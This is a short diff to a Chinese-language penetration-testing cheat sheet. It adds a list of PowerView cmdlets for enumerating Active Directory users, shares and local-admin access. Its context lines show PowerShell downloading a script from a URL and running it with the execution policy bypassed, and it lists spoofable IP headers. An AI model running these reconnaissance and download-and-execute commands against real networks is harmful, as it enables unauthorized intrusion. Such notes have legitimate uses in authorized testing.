@@ -121,6 +121,11 @@ Get-Item -Path file.exe -Stream * 在文件file.exe中查找所有stream ，这�
 powershell 下载文件 (new-object system.net.webclient).downloadfile("http://www.baidu.com/test.ps1") 或者invoke-webrequest "http//www.baidu.com/test.ps1" -outfile test.ps1
 设置执行策略  powershell -executionpolicy bypass -file .\test.ps1
 
+powerview.ps1 
+get-netuser , get-netcomputer, get-netgroup,get-netgpo, find-domainshare -checkshareaccess,
+find-localadminaccess,get-hotfix 补丁,set-executionpolicy bypass -scope process,get-process,copy-item,
+select-object,where-object,select-string,get-domainuser,get-aduser
+
 
 
 Http_header 包含IP的参数:X-Forwarded-For,X-Forwarded-Host,X-Client-IP,X-Remote-IP,X-Remote-Addr,X-Host
